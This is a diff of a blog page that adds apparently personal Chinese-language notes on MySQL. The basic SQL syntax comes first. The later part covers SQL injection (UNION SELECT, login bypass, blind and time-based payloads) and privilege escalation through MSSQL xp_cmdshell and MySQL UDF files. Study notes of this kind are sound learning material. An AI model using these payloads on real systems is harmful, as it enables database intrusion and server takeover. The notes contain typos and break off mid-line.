@@ -195,7 +195,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Fri Aug 22 2025 21:11:00 GMT+0800">2025-08-22 21:11:00</span>
+                    <span class="datetime" data-updated="Sat Aug 23 2025 12:40:40 GMT+0800">2025-08-23 12:40:40</span>
                 </span>
             
         
@@ -222,7 +222,463 @@
                     
 
                     
-                         
+                         <h1 id="MySQL开启与关闭"><a href="#MySQL开启与关闭" class="headerlink" title="MySQL开启与关闭"></a>MySQL开启与关闭</h1><p>MySQL服务器：cmd管理员：net start mysql93   ;   net stop mysql93</p>
+<p>进入MySQL Client（ 命令行客户端 ）：mysql -u root -p  ;   exit</p>
+<h1 id="MySQL简介"><a href="#MySQL简介" class="headerlink" title="MySQL简介"></a>MySQL简介</h1><p>DBMS软件系统（不是数据库），通过该系统管理、维护数据库。MySQL对应关系型数据库【用行和列组织数据】，MySQL【类Exel】里的数据库为Schema【类Exel文件】，数据库里有不同的Table（表格）【类Exel里的不同标签】</p>
+<p>数据库在服务器下，每台服务器可有多个数据库</p>
+<p><strong>SQL</strong>：编程语言</p>
+<h1 id="数据类"><a href="#数据类" class="headerlink" title="数据类"></a>数据类</h1><h1 id="型"><a href="#型" class="headerlink" title="型"></a>型</h1><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>INT</td>
+<td>整型</td>
+<td>4字节</td>
+</tr>
+<tr>
+<td><u><strong>BIGINT</strong></u></td>
+<td>长整型</td>
+<td>8字节</td>
+</tr>
+<tr>
+<td>REAL</td>
+<td>浮点型</td>
+<td>4字节</td>
+</tr>
+<tr>
+<td>DOUBLE</td>
+<td>浮点型</td>
+<td>8字节</td>
+</tr>
+<tr>
+<td>DECIMAL(M,N)</td>
+<td>高精度小数</td>
+<td>由用户指定精度，<!--DECIMAL(20,10)表示一共20位，其中小数10位--></td>
+</tr>
+<tr>
+<td>CHAR(N)</td>
+<td>定长字符串</td>
+<td>存储指定长度的字符串，CHAR(100)总是存储100个字符的字符串</td>
+</tr>
+<tr>
+<td><strong><u>VARCHAR(N)</u></strong></td>
+<td>变长字符串</td>
+<td>存储可变长度的字符串，例如，VARCHAR(100)可以存储0~100个字符的字符串</td>
+</tr>
+<tr>
+<td>BOOLEAN</td>
+<td>布尔类型</td>
+<td>存储True或者False</td>
+</tr>
+<tr>
+<td>DATE</td>
+<td>日期类型</td>
+<td>存储日期，例如，2018-06-22</td>
+</tr>
+<tr>
+<td>TIME</td>
+<td>时间类型</td>
+<td>存储时间，例如，12:20:59</td>
+</tr>
+<tr>
+<td>DATETIME</td>
+<td>日期和时间类型</td>
+<td>存储日期+时间，例如，2018-06-22 12:20:59</td>
+</tr>
+</tbody></table>
+<h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><p>排序方式： utf8mb4_unicode_ci ：精准</p>
+<p> <strong>utf8mb4_general_ci</strong> ：快速、 对部分语言的特殊字符处理不够 </p>
+<p>（utf8（3字节)无法存储emoji与特殊字符，utf8mb4（4字节）完整）</p>
+<p> ci（case-insensitive）表示不区分大小写，cs（case-sensitive）表示区分大小写， </p>
+<h1 id="增"><a href="#增" class="headerlink" title="增"></a>增</h1><p>语句前加<code>-- </code>可注释该语句（两个 <code>-</code> 一个空格）</p>
+<ul>
+<li><p>CREATE DATABASE 【数据库名】;<!--创建名为……的数据库--></p>
+</li>
+<li><p>USE 【数据库名】；<!--进入……数据库--></p>
+</li>
+<li><p>CREATE TABLE 【表格名】（<!-- 要为表格设置列名【类Exel里的表头】--></p>
+<p>【列名1】 INT 【可选加条件】， </p>
+<p>【列名2】 VARCHAR()，<!--字符串，括号内限定字符个数--></p>
+<p>【列名3】DATE <!--日期，格式【年】-【月】-【日】--></p>
+<p>）；</p>
+<ul>
+<li><p>数据类型后可选加：（用空格隔开）</p>
+<ul>
+<li><p><strong>NUT NULL</strong>：作用是增加数据时必须输入内容</p>
+</li>
+<li><p><strong>NULL</strong>：该列可以为空，不输入默认NULL值</p>
+</li>
+<li><p><strong>AUTO_INCREMENT</strong>：自动递增数字</p>
+</li>
+<li><p><strong>PRIMARY KEY</strong>：主键，将其中一个列名设置为主键，则列里面的数据必须唯一，且默认NUT NULL</p>
+<p> 不使用任何业务相关的字段（证件号码，手机号等）作为主键 ；一般使用自增整数或UUID</p>
+</li>
+<li><p><strong>ENUM</strong>(‘选项1’,’选项2’,’选项3’)DEFAULT ‘某选项’ ：枚举型</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>注意！：创建表格设置列名可写在同行，列名间有<u>逗号</u>， 最后一个后没有。语句间用<code>;</code> 分隔</p>
+<ul>
+<li><p>快照（复制表的数据到新表）</p>
+<p><strong>CREATE TABLE</strong> 【新表名】</p>
+<p>SELECT *  FORM 【已有表】 WHRER 【条件】；</p>
+</li>
+<li><p>查询结果写入新表</p>
+<p>INSERT INTO 【新表】 (【新列1】, 【新列2】) SELECT 【旧列1】, 【旧列2】 FROM 【旧表】GROUP BY 【某相同列】;</p>
+</li>
+</ul>
+<h2 id="VARCHAR长度建议"><a href="#VARCHAR长度建议" class="headerlink" title="VARCHAR长度建议"></a>VARCHAR长度建议</h2><table>
+<thead>
+<tr>
+<th align="left">长度</th>
+<th align="left">适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">VARCHAR(20)</td>
+<td align="left">手机号、邮编等</td>
+</tr>
+<tr>
+<td align="left">VARCHAR(50)</td>
+<td align="left">用户名等</td>
+</tr>
+<tr>
+<td align="left">VARCHAR(255)</td>
+<td align="left">较长文本</td>
+</tr>
+</tbody></table>
+<h1 id="改"><a href="#改" class="headerlink" title="改"></a>改</h1><ul>
+<li><p><strong>INSERT INTO</strong> 【数据库名】.【表格名】<strong>（</strong>【列名1】，【列名2】）</p>
+<p><strong>VALUES</strong>(【数值1】，【数值2】) <strong>，</strong>（【数值3】，【数值4】) <strong>;</strong> <!--VARCHAR和DATE里的字符用引号（建议单引号）括起来--></p>
+<!--若每一列都插入数据，则可不指明列名-->设置了AUTO_INCREMENT的数值可输入为**DEFAULT** ,设NULL的可输入NULL， 有默认值的字段在INSERT语句中可不出现。 
+
+</li>
+<li><p><strong>ALTER TABLE</strong> 【数据库名】.【表名】<!--改变;WHEW/更新表格--></p>
+<p><strong>ADD</strong> 【列名】 【数据类型】 【默认条件】 AFTER 【列名】**;**<!--增加表格列名--></p>
+</li>
+<li><p><strong>UPDATE</strong> 【数据库名】.【表名】<!--修改具体数据--></p>
+<p><strong>SET</strong>  【列名】&#x3D;【值】</p>
+<p>WHERE 【条件】<strong>；</strong>   <!--定位哪条数据（行）：【列名】=【值】，注意顺序--><!--没有WHERE整个表都会被更新--></p>
+</li>
+<li><p>插入或替换一行（有就替换，没有就插入）</p>
+<p><strong>REPLACE INTO</strong>【表名】（【列名1】，【列名2】）<strong>VALUES</strong>（【值1】，【值2】）</p>
+</li>
+<li><p>插入或更新（无该记录则插入（VALUES后），有该记录就更新（UPDATE后）</p>
+<p><strong>INSERT INTO</strong> 【表名】（【列名1】，【列名2】）<strong>VALUES</strong>（【值1】，【值2】） <strong>ON DUPLICATE KEY UPDATE</strong>  【列名1】&#x3D;【值1】【列名2】&#x3D;【值2】；</p>
+</li>
+<li><p>插入或忽略（有记录就不执行）</p>
+<p><strong>INSERT IGNORE INTO</strong> 【表名】（【列名1】，【列名2】）<strong>VALUES</strong>（【值1】，【值2】）</p>
+</li>
+</ul>
+<p>sql中<code>=</code> 为赋值、相等的意思</p>
+<h1 id="删"><a href="#删" class="headerlink" title="删"></a>删</h1><p>可先ALTER TABLE 【表名】<!--修改表--></p>
+<ul>
+<li><p>DELETE FROM 【数据库名】.【表名】<!--删除某条数据--></p>
+<p>WHRER 【定位条件】**;**<!--没有WHERE整个表都会被删除--></p>
+</li>
+<li><p>DROP TABLE 【数据库名】.【表名】<strong>；</strong><!--删除整个表格--></p>
+</li>
+<li><p>DROP DATABASE 【数据库名】<strong>；</strong><!--删除整个数据库--></p>
+</li>
+<li><p>DROP COLUMN 【列名】</p>
+</li>
+</ul>
+<h1 id="查"><a href="#查" class="headerlink" title="查"></a>查</h1><ul>
+<li><p>SHOW DATABASES;<!--列出所有数据库--></p>
+</li>
+<li><p>SELECT ***** </p>
+<p>FROM 【表格名】;<!--查看表格全部-->(此处用ORDER BY 没用？)</p>
+</li>
+<li><p>SELECT 【列名1】，【列名2】</p>
+<p>FROM 【表格名】；<!--前先USE 【数据库名】--><!--注意语句顺序--></p>
+<p>WHERE 【条件】</p>
+<p>ORDER BY 【列名1】【可加排序：ASC（默认即）或DESC】，【列名2】；<!--Ascending与Descending（高->低）--><!--先按列1排序，若有相同的再按列2排序--></p>
+</li>
+<li><p>给列起<u>别名</u></p>
+<p>SELLECT 【列1】【 别名1】，【 列2】【别名2】, 【列3】【别名3】</p>
+<p> FROM …</p>
+</li>
+<li><p>分页查询</p>
+<p>SELECT …</p>
+<p>FORM …</p>
+<p>ORDER BY …</p>
+<p>LIMIT 【m-n】OFFSET 【m】;<!--简化写法:LIMIT 【m-n】，【m】--></p>
+<!--OFFSET不写默认OFFSET 0； -->
+
+<!-- 分页结果为“截取”第M~N条记录（结果集从0号开始）；m-n即pageSize表示最大记录条数，m即 pageSize*[索引（该页数）-1]-->
+</li>
+<li><p>SELECT  <strong>DISTINCT</strong>【列名】</p>
+<p>FROM 【表名】；<!--去除重复的列里的数据--></p>
+</li>
+<li><p>查询列的行数 </p>
+<p>SELECT <strong>COUNT(*)</strong> 【新设列名（不写则为<code>COUNT(*)</code> ）】FROM 【表名】;<!--结果是一行一列的二维表--></p>
+</li>
+<li><p>SELECT 1;<!-- 不带FROM子句的SELECT语句可用来 测试数据库连接--></p>
+</li>
+</ul>
+<h2 id="WHERE处运算符的使用"><a href="#WHERE处运算符的使用" class="headerlink" title="WHERE处运算符的使用"></a>WHERE处运算符的使用</h2><p>比较运算符:</p>
+<table>
+<thead>
+<tr>
+<th>比较运算符</th>
+<th></th>
+<th>应用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x3D; , &gt; , &lt;  ,&gt;&#x3D; , &lt;&#x3D;</td>
+<td></td>
+<td>【列名】&#x3D;【值（字符要加‘ ’】</td>
+</tr>
+<tr>
+<td><code>!=</code>  或  <code>&lt;&gt;</code></td>
+<td>不等于</td>
+<td></td>
+</tr>
+<tr>
+<td>BETWEEN</td>
+<td>两值之间</td>
+<td>【列名】BETWEEN 【值1】AND【值2】</td>
+</tr>
+<tr>
+<td>IN</td>
+<td>一组值里（只显示（）里的值）</td>
+<td>【列名】IN（【值1】，【值2】）</td>
+</tr>
+<tr>
+<td>LIKE</td>
+<td>相似匹配</td>
+<td>【列名】<code>LIKE &#39;B%&#39;</code>：该列的值以B开头的<br>【列名】<code>LIKE &#39;_b&#39;</code>：值共两个字母,第二个字母是b<br>【列名】<code>LIKE &#39;_b%&#39;</code>：值的第二个字母是b( <code>-</code> 表示任意字符）<br>【列名】<code>LIKE &#39;%a&#39;</code>：值以a结尾<br></td>
+</tr>
+</tbody></table>
+<p>逻辑运算符：</p>
+<table>
+<thead>
+<tr>
+<th>逻辑运算符</th>
+<th></th>
+<th>应用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AND</td>
+<td>与</td>
+<td>【条件1】AND【条件2】</td>
+</tr>
+<tr>
+<td>OR</td>
+<td>或</td>
+<td></td>
+</tr>
+<tr>
+<td>NOT 或 ！</td>
+<td>非</td>
+<td>NOT 【列名】&#x3D;【值】<u>等同于</u> 【列名】&lt;&gt;【值】</td>
+</tr>
+</tbody></table>
+<p>加括号可改变优先级，不加括号则 NOT、AND、OR优先级从高到低</p>
+<h2 id="（连接查询）合并两个表格的数据"><a href="#（连接查询）合并两个表格的数据" class="headerlink" title="（连接查询）合并两个表格的数据"></a>（连接查询）合并两个表格的数据</h2><p>对多表进行JOIN运算，先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。 </p>
+<ul>
+<li><p>SELECT*</p>
+<p>FROM 【表1名】<!--表1数据在左--></p>
+<p><strong>INNER JOIN</strong> 【表2名】<!--两表取交集--><!--表2数据在右--></p>
+<p><strong>ON</strong> 【表1名】.【列a】&#x3D;【表2名】.【列a】;<!--两表格行对应合并的条件--><!--右表的列a的值与右表的列a的值相同的行合并（注意a=a）--></p>
+</li>
+<li><p>SELECT*</p>
+<p>FROM 【表1名】<!--表1数据在左--></p>
+<p><strong>RIGHT OUTER JOIN</strong> 【表2名】<!-- 返回右表都存在的行。若某行左表无，则会以NULL填充剩下的字段--></p>
+<!--同理，LEFT OUTER JION返回左表都存在的行;而FULL OUTER JOIN会返回所有记录，并自动把对方不存在的列填充为NULL -->
+
+<p><strong>ON</strong> </p>
+</li>
+<li><!--UUNION SELECT要求两张表的列数和数据类型必须匹配 --></li>
+</ul>
+<p>  SELECT 【列a】</p>
+<p>  FROM【表1名】</p>
+<p>  <strong>UNION</strong> <!--UNION会去重，UNION ALL不会去重--></p>
+<p>  <strong>SELECT</strong> 【列a】</p>
+<p>  FROM【表2名】;<!--将两表里的列a合并（上下拼接）--></p>
+<ul>
+<li><p>UNION SELECT 后面可不指定表格名（可无from)：</p>
+<p>……UNION SELECT <u>NULL,NULL</u> </p>
+</li>
+<li><p>左连接：保留左边表格所有选取的数据，合并右表符合条件的数据（左表所有，右表部分）</p>
+<p>SELECT*</p>
+<p>FROM 【表1名】</p>
+<p><strong>LEFT JOIN</strong> 【表2名】</p>
+<p><strong>ON</strong> 【条件】;<!--如【表1名】.【列a】=【表2名】.【列a】即保留表1的列a所有值，把表2的列a符合条件的行向左合并到表1--></p>
+</li>
+<li><p>右连接：保留右边表格所有选取的数据，合并左表符合条件的数据（右表所有，左表部分）</p>
+<p>SELECT*</p>
+<p>FROM 【表1名】</p>
+<p><strong>RIGHT JOIN</strong> 【表2名】</p>
+<p><strong>ON</strong> 【条件】;</p>
+</li>
+<li><p>关于简写：</p>
+<p>SELECT*</p>
+<p>FROM 【表1名】<strong>AS</strong>  【简写1】<!--表1被简写--></p>
+<p>RIGHT JOIN 【表2名】<strong>AS</strong>  【简写2】<!--表2被简写--></p>
+<p>ON 【简写1】.【列a】&#x3D;【简写2】.【列a】;</p>
+</li>
+</ul>
+<h1 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h1><p>（实现） 通过定义外键约束实现 （ 不同于通过列名实现的主键） </p>
+<p>（作用） 通过值可以把数据与另一张表关联起来的列称为外键 </p>
+<ul>
+<li><p><strong>ALTER TABLE</strong> 【该表名】</p>
+<p><strong>ADD CONSTRAINT</strong> 【外键约束的名称（自定）】</p>
+<p><strong>FOREIGN KEY</strong> <strong>(<strong>【该表的外键（列名）】</strong>)</strong></p>
+<p><strong>REFERENCES</strong> 【另一张表名】 <strong>(<strong>【另一张表的主键（列名）】</strong>)</strong> ;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE a_table</span><br><span class="line">ADD CONSTRAINT a_name</span><br><span class="line">FOREIGN KEY (a_list)</span><br><span class="line">REFERENCES that_table (that_list);</span><br><span class="line">-- 注意列名有加（）</span><br></pre></td></tr></table></figure></li>
+</ul>
+<!---->
+
+<p>删除外键</p>
+<ul>
+<li><p>ALTER TABLE 【该表名】</p>
+<p>DROP FOREIGN KEY 【该表的外键（列名）】;</p>
+<!--注意列名没有（）--></li>
+</ul>
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>COUNT（【某列名】或 <code>*</code>）</td>
+<td>计算某列的行数</td>
+</tr>
+<tr>
+<td>SUM</td>
+<td>计算某一列的合计值（必须为数值类型）</td>
+</tr>
+<tr>
+<td>AVG</td>
+<td>计算某一列的平均值（必须为数值类型）</td>
+</tr>
+<tr>
+<td>MAX</td>
+<td>计算某一列的最大值</td>
+</tr>
+<tr>
+<td>MIN</td>
+<td>计算某一列的最小值</td>
+</tr>
+</tbody></table>
+<h2 id="其它函数"><a href="#其它函数" class="headerlink" title="其它函数"></a>其它函数</h2><p>SUBSTRING(字符串, 起始位置, 长度)</p>
+<p>IF函数： IF(condition, value_if_true, value_if_false) </p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p> 数据库管理员 (<code>DBA</code> &#x2F; <code>SA</code> &#x2F; <code>root</code>)  </p>
+<p>账号密码的数据库查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;输入的用户名&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;输入的密码&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h2><ul>
+<li><p>确定列数</p>
+<p>SELECT * FROM 【表名】</p>
+<p>UNION SELECT <u>NULL,NULL</u> </p>
+<p>—&gt;NULL 的个数与前表的列数相同就通过</p>
+</li>
+<li><p>测试数据类型</p>
+<p>SELECT * FROM 【表名】</p>
+<p>UNION SELECT  <u>‘1’,NULL</u> </p>
+<p>–&gt;用数字逐列测试得数据类型为数字的列</p>
+</li>
+<li><p>用户名处加 ‘ 提前闭合（语法正确）；UNION SELECT后加要查的；最后加<code>-- </code> 注释掉后面的语句</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span> <span class="comment">--&#x27; AND password = &#x27;输入的密码&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注在执行时不会返回错误信息或查询结果，需要利用条件判断和延时技术来推断数据库信息。 </p>
+<ul>
+<li><p>SUBSTRING(字符串, 起始位置, 长度)</p>
+<p>逐个尝试找正确的密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> unser<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>sleep(N)</p>
+<p> IF(SUBSTRING(    password,1,1)&#x3D; ‘a’     , SLEEP(5) , 0 )</p>
+</li>
+</ul>
+<h1 id="MSSQL盲注提权"><a href="#MSSQL盲注提权" class="headerlink" title="MSSQL盲注提权"></a>MSSQL盲注提权</h1><p> Microsoft <u>SQL Server</u> </p>
+<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><ol>
+<li>存在 SQL 注入点 </li>
+<li>当前数据库账户权限较高（最好是 <code>sysadmin</code> 角色） </li>
+<li>数据库能执行 <code>xp_cmdshell</code></li>
+</ol>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
+<li><p>测试是否有SQL 注入漏洞： 有页面响应差异（布尔盲注）或响应时间差异（时间盲注）</p>
+</li>
+<li><p>判断权限</p>
+<p>注入<code>IF(IS_SRVROLEMEMBER(&#39;sysadmin&#39;)=1 WAITFOR DELAY &#39;0:0:5&#39;</code> 检测管理员权限 </p>
+</li>
+<li><p>启用xp_cmdshell：</p>
+</li>
+</ol>
+<p>   <code>EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;</code> （开启高级选项）</p>
+<p>   <code>EXEC sp_configure &#39;xp_cmdshell&#39;,1; RECONFIGURE</code></p>
+<ol start="4">
+<li>测试命令执行</li>
+</ol>
+<p>   <code>EXEC xp_cmdshell &#39;whoami&#39;;</code></p>
+<p>   若无回显可：</p>
+<pre><code>`EXEC xp_cmdshell &#39;whoami &gt; C:\\inetpub\\wwwroot\\a.txt&#39;;`&lt;!-- 这里的文件会被 Web 服务直接对外公开 --&gt;
+</code></pre>
+<p>   浏览器访问 <code>http://目标网站/a.txt</code> 查看。</p>
+<ol start="5">
+<li>提权到系统控制</li>
+</ol>
+<h1 id="MySQL-UDF提权"><a href="#MySQL-UDF提权" class="headerlink" title="MySQL UDF提权"></a>MySQL UDF提权</h1><h2 id="前置条件-1"><a href="#前置条件-1" class="headerlink" title="前置条件"></a>前置条件</h2><ol>
+<li>MySQL当前用户拥有 FILE 权限 （才能 写入 <code>.so</code> 或 <code>.dll</code> 动态库文件 ）</li>
+</ol>
+<p>   <code>SHOW GRANTS FOR CURRENT_USER();</code></p>
+<p>   需有<code>GRANT FILE ON *.* TO &#39;xxx&#39;@&#39;host&#39;</code></p>
+<ol start="2">
+<li><p>有插件目录路径 （<code>plugin_dir</code>）且可写 &#x2F; 有其它可访问路径 </p>
+<p>查询 : <code>SHOW VARIABLES LIKE &#39;plugin_dir&#39;;</code></p>
+</li>
+<li><p>当前用户最好有执行系统命令的权限</p>
+</li>
+</ol>
+<h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><ol>
+<li><p>准备恶意UDF文件 （Windows是.ddl ; Linux是.so）</p>
+</li>
+<li><p>上传UDF到服务器</p>
+</li>
+</ol>
+<ul>
+<li>SQL写文件 （Linux）</li>
+</ul>
+<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;恶意二进制数据的HEX编码&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;路径&#x27;</span>;</span><br></pre></td></tr></table></figure>
+</code></pre>
+<ul>
+<li>文件上传漏洞</li>
+</ul>
+<ol start="3">
+<li>在MySQL中注册UDF函数</li>
+</ol>
+   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_exec <span class="keyword">RETURNS</span> <span class="type">integer</span> SONAME <span class="string">&#x27;上传的文件名&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>使用UDF执行系统命令</li>
+</ol>
+<ul>
+<li><code>SELECT sys_exec(&#39;whoami&#39;);</code> 返回0则成功</li>
+</ul>
+<ol start="5">
+<li>系统层面提权</li>
+</ol>
+<p>MySQL UDF 中fuction创建插件的名称有什么要求</p>
+<p>只能创建so文件中存在的函数</p>
+<p>用    map</p>
+<p>CREATE FUNCTION sys_eval RETURNS ST</p>
+
                     
                 </div>
 
@@ -245,14 +701,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/1970/01/01/HTTP/"
-                                   title="HTTP"
+                                   href="/1970/01/01/XSS/"
+                                   title="XSS"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">HTTP</span>
+                                        <span class="post-nav-title-item text-ellipsis">XSS</span>
                                         <span class="post-nav-item">上一篇</span>
                                     </span>
                                 </a>
@@ -262,11 +718,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/1970/01/01/XSS/"
-                                   title="XSS"
+                                   href="/1970/01/01/php/"
+                                   title="php"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">XSS</span>
+                                        <span class="post-nav-title-item text-ellipsis">php</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
